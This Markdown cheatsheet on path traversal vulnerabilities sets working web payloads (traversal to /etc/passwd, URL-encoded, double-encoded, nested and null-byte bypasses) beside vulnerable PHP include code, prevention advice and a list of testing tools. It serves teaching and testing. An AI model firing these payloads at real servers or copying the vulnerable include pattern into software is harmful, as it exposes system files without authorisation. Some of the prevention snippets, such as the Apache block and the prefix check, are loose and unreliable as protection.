# 🔥 Path Traversal Vulnerabilities Cheatsheet

## 🎯 What is Path Traversal?

**Path traversal**, also known as directory traversal, is a web security vulnerability that allows an attacker to access files or directories on a server outside the intended file path. By manipulating file path parameters, attackers can bypass access controls and read arbitrary files, such as:
- Sensitive configuration files (`/etc/passwd`, `web.config`).
- Application source code.
- Logs containing sensitive data.

---

## 📂 Reading Arbitrary Files via Path Traversal

### 1. **Basic Example**
- **Vulnerable Code:**
  ```php
  <?php
  $file = $_GET['file'];
  include("/var/www/files/" . $file);
  ?>
  ```
- **Payload:**
  ```http
  GET /?file=../../../../etc/passwd HTTP/1.1
  ```
- **Explanation:**
  - The `../` sequences navigate up directories.
  - The payload resolves to `/etc/passwd`.

---

### 2. **Encoded Payloads**
- URL-encoding can be used to bypass naive filters:
  - `%2e%2e%2f` = `../`
  - `%2e%2e%5c` = `..\` (Windows systems).

### 3. **Double-URL Decoding**
- If the application decodes input multiple times, try encoding multiple layers:
  - First encoding: `%252e%252e%252f` = `%2e%2e%2f` = `../`

---

### 4. **Null Byte Injection**
- Null byte (`%00`) injection can bypass file extension checks:
  - **Payload:**
    ```http
    GET /?file=../../../../etc/passwd%00.png
    ```
  - **Explanation:**
    - `%00` terminates the string in some programming languages (e.g., C).

---

## 🔒 Common Obstacles to Exploiting Path Traversal Vulnerabilities

### 1. **Blocked Traversal Sequences**
- **Mitigation Example:**
  ```php
  if (strpos($file, '../') !== false) {
      die("Access denied");
  }
  ```
- **Bypass Techniques:**
  - Encode traversal sequences:
    - `%2e%2e%2f` for `../`
  - Use nested traversal:
    ```http
    ....//....//etc/passwd
    ```

---

### 2. **Stripping Traversal Sequences**
- Some applications strip `../` non-recursively:
  - **Example Filter:**
    - `file = str_replace("../", "", file);`
  - **Bypass:**
    ```http
    ....//etc/passwd
    ```

---

### 3. **Validation of Start of Path**
- Applications validate that the file path starts with an expected value:
  - **Example Filter:**
    - Allow only `/var/www/files/`.
  - **Bypass:**
    ```http
    /var/www/files/../../../../etc/passwd
    ```

---

### 4. **Validation of File Extension**
- File inclusion may enforce extensions (e.g., `.txt`):
  - **Bypass:** Use a null byte (`%00`):
    ```http
    GET /?file=../../../../etc/passwd%00.txt
    ```

---

## 🛡️ How to Prevent Path Traversal Attacks

1. **Validate User Input**
   - Use a whitelist of allowed file names.
   - Reject or sanitize input containing traversal sequences (`../`, `..\\`).

2. **Canonicalize File Paths**
   - Resolve file paths to their absolute equivalents and validate:
     ```php
     $realPath = realpath($baseDir . $file);
     if (strpos($realPath, $baseDir) !== 0) {
         die("Invalid file path");
     }
     ```

3. **Restrict Access to Necessary Directories**
   - Limit file access to a specific directory using server settings.
   - Example (Apache):
     ```apache
     <Directory /var/www/files>
         AllowOverride None
         Require all granted
     </Directory>
     ```

4. **Avoid Dynamic Path Construction**
   - Don’t concatenate user input into file paths:
     ```php
     include("/var/www/files/" . $file); // Avoid!
     ```

5. **Disable Unnecessary Functions**
   - Disable potentially dangerous PHP functions:
     ```ini
     disable_functions = "system, exec, shell_exec, passthru, popen"
     ```

6. **Use Framework-Specific Controls**
   - Many frameworks provide safe file handling methods:
     - **Python:** Use `os.path.join` and validate with `os.path.commonpath`.
     - **Java:** Use `java.nio.file.Paths` and `Files`.

---

## 🛠️ Tools for Path Traversal Testing

| Tool          | Purpose                             | URL/Command                            |
|---------------|-------------------------------------|----------------------------------------|
| Burp Suite    | Manual path traversal testing       | [Burp Suite](https://portswigger.net)  |
| wfuzz         | Automated payload fuzzing           | `wfuzz -z file,wordlist.txt -u URL`    |
| OWASP ZAP     | Automated vulnerability scanning    | [ZAP](https://owasp.org/www-project-zap/) |
| dirb          | Directory brute-forcing             | `dirb URL wordlist.txt`                |
| Path Traversal Labs | Practice path traversal attacks | [PortSwigger Labs](https://portswigger.net/web-security/file-path-traversal) |
